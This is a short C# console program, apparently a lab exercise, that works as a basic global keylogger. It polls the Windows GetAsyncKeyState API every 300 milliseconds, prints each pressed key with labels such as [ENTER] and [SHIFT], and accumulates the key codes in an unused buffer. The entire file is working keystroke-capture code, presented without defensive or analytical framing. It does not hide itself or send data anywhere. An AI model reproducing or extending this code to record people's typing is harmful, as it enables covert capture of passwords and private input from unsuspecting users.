using System;
using System.Text;
using System.Collections;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;

namespace LR4
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(int i);
        static void Main(string[] args)
        {
            StringBuilder input = new StringBuilder();
            while (true)
            {
                Thread.Sleep(300);
                for (int i = 8; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState != 0)
                    {
                        Console.Write(i);
                        switch (i)
                        {
                            case 8:
                                Console.WriteLine(" [BACKSPACE]");
                                break;
                            case 9:
                                Console.WriteLine(" [TAB]");
                                break;
                            case 13:
                                Console.WriteLine(" [ENTER]");
                                break;
                            case 16:
                                Console.WriteLine(" [SHIFT]");
                                break;
                            case 17:
                                Console.WriteLine(" [CTRL]");
                                break;
                            case 32:
                                Console.WriteLine(" [SPACE]");
                                break;
                            case 46:
                                Console.WriteLine(" [DELETE]");
                                break;
                            default:
                                Console.WriteLine($" {(char)i}");
                                break;
                        }
                        input.Append($"{Convert.ToString(i)} ");
                    }
                }
            }
        }
    }
}
